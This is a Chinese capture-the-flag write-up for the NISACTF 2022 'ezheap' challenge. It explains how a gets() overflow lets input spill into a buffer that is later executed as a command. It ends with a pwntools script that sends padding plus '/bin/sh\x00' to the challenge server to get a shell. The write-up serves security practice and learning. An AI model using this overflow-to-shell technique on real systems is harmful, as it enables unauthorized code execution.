[[NISACTF 2022]ezheap | NSSCTF](https://www.nssctf.cn/problem/2058)
![[Pasted image 20240901174212.png]]
![[Pasted image 20240901174231.png]]
看着挺简单的一道题目，开始给s,command分配了内存~~然后就没头绪了~~
执行gets后发现输入的字符会存在两个地址里
![[Pasted image 20240901174433.png]]
步进后发现command会执行`0x804b1c0`内的字符
![[Pasted image 20240901174505.png]]
可知只要找到输入多少a后能恰好把`/bin/sh`放在`0x804b1c0`里就能获得shell
网上的wp好像说是和堆相关的知识，还没学到的话我就一个一个试的暴力破解
试出来垃圾数据的数量是`0x20`。**输入的`/bin/sh`后面记得加上`\x00`**
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='i386', os='linux', log_level='debug')
local = False
elf = ELF('./ezheap')
if local:
    p = process('./ezheap')
    pwnlib.gdb.attach(p, 'b *0x804857F')
else:
    p = remote('node5.anna.nssctf.cn', 21970)
offset = 0x16 + 10
p.recvuntil(b"Input:\n")
p.sendline(b"A"*offset + b'/bin/sh\x00')
p.interactive()
```


